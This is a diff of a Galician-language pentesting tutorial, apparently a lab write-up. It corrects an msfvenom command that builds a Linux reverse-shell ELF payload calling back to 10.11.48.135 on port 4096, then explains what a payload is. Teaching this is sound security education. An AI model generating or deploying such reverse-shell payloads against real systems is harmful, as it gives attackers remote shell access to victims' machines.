@@ -191,7 +191,7 @@
 
  ### **Atacante:**
 
-  1º) Creamos o payload -> `msfvenom -p linux/x86/shell/reverse_tcp LHOST=10.11.48.135 LPORT=4096 -f elf > payload.bin` .
+  1º) Creamos o payload -> `msfvenom -p linux/x86/shell_reverse_tcp LHOST=10.11.48.135 LPORT=4096 -f elf > payload.bin` .
   
     Un payload é basicamente unha parte ou un paso que generamos para facer unha accion maliciosa específica despois de que o sistema 
     obxetivo fose infectado. 
